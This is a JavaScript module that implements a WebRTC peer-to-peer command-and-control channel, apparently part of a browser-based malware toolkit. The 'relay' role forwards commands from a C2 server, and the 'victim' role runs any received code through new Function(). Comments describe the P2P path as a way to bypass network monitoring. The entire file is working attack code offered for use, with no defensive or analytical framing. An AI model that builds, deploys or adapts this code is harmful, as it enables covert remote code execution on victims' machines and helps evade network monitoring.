// webrtc-c2.js - WebRTC P2P C2 Channel Module
// Extracted for modularity - handles relay/victim mesh networking

class WebRTCC2 {
  constructor(socket, onMessage) {
    this.socket = socket;
    this.onMessage = onMessage || console.log;
    this.rtcPeer = null;
    this.dataChannel = null;
    this.role = null; // 'relay' or 'victim'
  }

  log(msg) {
    console.log('[WebRTC-C2]', msg);
    if (window.showC2Msg) window.showC2Msg(msg);
  }

  // === RELAY MODE ===
  // Relay receives commands from C2 server and forwards to victims via WebRTC
  becomeRelay() {
    this.role = 'relay';
    this.log('📡 Becoming C2 relay...');

    this.rtcPeer = new RTCPeerConnection({ iceServers: [] });
    this.dataChannel = this.rtcPeer.createDataChannel('c2');

    this.rtcPeer.onicecandidate = (e) => {
      if (e.candidate) return;
      const offer = this.rtcPeer.localDescription;
      this.socket.emit('webrtc_offer', offer);
    };

    this.dataChannel.onopen = () => {
      this.log('✅ DataChannel open to victim');
    };

    this.dataChannel.onmessage = (e) => {
      const msg = JSON.parse(e.data);
      if (msg.type === 'ack') {
        this.log('📨 Victim acknowledged: ' + msg.payload);
      }
      this.onMessage(msg);
    };

    this.dataChannel.onerror = (err) => {
      this.log('❌ DataChannel error: ' + err.message);
    };

    this.rtcPeer.createOffer()
      .then(offer => this.rtcPeer.setLocalDescription(offer));
  }

  // === VICTIM MODE ===
  // Victim connects to relay, receives commands via P2P (bypasses network monitoring)
  becomeVictim() {
    this.role = 'victim';
    this.log('👁️‍🗨️ Becoming C2 victim...');

    this.socket.on('webrtc_answer_request', (offer) => {
      this.rtcPeer = new RTCPeerConnection({ iceServers: [] });
      this.rtcPeer.setRemoteDescription(offer);
      this.rtcPeer.createAnswer()
        .then(ans => this.rtcPeer.setLocalDescription(ans));

      this.rtcPeer.ondatachannel = (e) => {
        this.dataChannel = e.channel;

        this.dataChannel.onopen = () => {
          this.log('🔓 Connected to C2 relay');
        };

        this.dataChannel.onmessage = (ev) => {
          const msg = JSON.parse(ev.data);
          this.handleVictimMessage(msg);
        };

        this.dataChannel.onerror = (err) => {
          this.log('❌ DataChannel error: ' + err.message);
        };
      };

      this.rtcPeer.onicecandidate = (e) => {
        if (e.candidate) return;
        this.socket.emit('webrtc_answer', this.rtcPeer.localDescription);
      };
    });
  }

  // Handle incoming messages when in victim mode
  handleVictimMessage(msg) {
    if (msg.type === 'execute') {
      this.log('⚡ Executing remote command...');
      try {
        const f = new Function(msg.code);
        f();
        this.sendAck('executed');
      } catch (ex) {
        this.sendAck('error: ' + ex.message);
      }
    }
    this.onMessage(msg);
  }

  // === UTILITY METHODS ===

  // Send command to victim (relay mode only)
  sendToVictim(code) {
    if (this.role !== 'relay') {
      this.log('❌ Not in relay mode');
      return false;
    }
    if (!this.dataChannel || this.dataChannel.readyState !== 'open') {
      this.log('❌ DataChannel not open');
      return false;
    }
    this.dataChannel.send(JSON.stringify({ type: 'execute', code }));
    return true;
  }

  // Send acknowledgment (victim mode)
  sendAck(payload) {
    if (this.dataChannel && this.dataChannel.readyState === 'open') {
      this.dataChannel.send(JSON.stringify({ type: 'ack', payload }));
    }
  }

  // Send arbitrary data over channel
  sendData(data) {
    if (this.dataChannel && this.dataChannel.readyState === 'open') {
      this.dataChannel.send(JSON.stringify(data));
      return true;
    }
    return false;
  }

  // Check connection status
  isConnected() {
    return this.dataChannel && this.dataChannel.readyState === 'open';
  }

  // Get current role
  getRole() {
    return this.role;
  }

  // Cleanup
  destroy() {
    if (this.dataChannel) {
      this.dataChannel.close();
    }
    if (this.rtcPeer) {
      this.rtcPeer.close();
    }
    this.rtcPeer = null;
    this.dataChannel = null;
    this.role = null;
    this.log('🔌 WebRTC C2 destroyed');
  }
}

// Export for module use
if (typeof module !== 'undefined' && module.exports) {
  module.exports = WebRTCC2;
}
